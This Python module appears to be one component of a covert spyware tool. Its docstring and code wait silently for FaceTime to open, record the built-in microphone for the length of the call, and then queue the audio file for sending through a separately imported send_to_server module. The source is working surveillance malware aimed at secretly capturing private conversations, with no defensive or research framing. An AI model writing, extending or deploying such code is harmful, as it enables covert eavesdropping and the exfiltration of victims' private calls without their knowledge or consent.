import time
from send_to_server import add_to_send_queue
from global_variables import run_command
import datetime

import tempfile
import queue
import sys

import sounddevice as sd
import soundfile as sf
"""
Waits silently for the user to open facetime. Begins recording audio through the built in mic
when facetime is opened. Stops recording when facetime is closed.
"""

#Checks if facetime is open. If raiseExceptionIfNot is set to true, will raise an exception
#if facetime is closed. This will cause the audio capture to stop if called inside capture_audio.
def facetimeIsActive(raiseExceptionIfNot):
    isActive = run_command("ps aux | grep -v grep | grep -c -i facetime")
    isActive = int(isActive.decode()[:-1])
    if isActive != 0:
        return True

    if raiseExceptionIfNot:
        raise Exception("Facetime has been turned off")
    
    return False


#wait for facetime to be opened. Start recording if open.
def audio_main():
    while True:
        if facetimeIsActive(False):
            capture_audio()
        else:
            time.sleep(5)




def run(options):
    
    pass


q = queue.Queue()


def callback(indata, frames, time, status):
    if status:
        print(status, file=sys.stderr)
    q.put(indata.copy())

def capture_audio():
    try:
        #Generate name for audio file based on current date and time
        currentDate = datetime.date.today().strftime("%b-%d-%Y")
        currentTime = datetime.datetime.now().strftime("%H-%M-%S")
        audioFilename = "./Data/audio/" + "Audio_" + currentDate + "_" + currentTime

        device_info = sd.query_devices(None, 'input')
        # soundfile expects an int, sounddevice provides a float:
        samplerate = int(device_info['default_samplerate'])

        filename = tempfile.mktemp(prefix=audioFilename,
                                        suffix='.wav', dir='')

        # Make sure the file is opened before recording anything:
        with sf.SoundFile(filename, mode='x', samplerate=samplerate,
                        channels=1, subtype=None) as file:
            with sd.InputStream(samplerate=samplerate, device=None,
                                channels=1, callback=callback):
                while True:
                    if datetime.datetime.now().second % 5 == 0:
                        facetimeIsActive(True)
                    file.write(q.get())
    except Exception:
        add_to_send_queue(filename)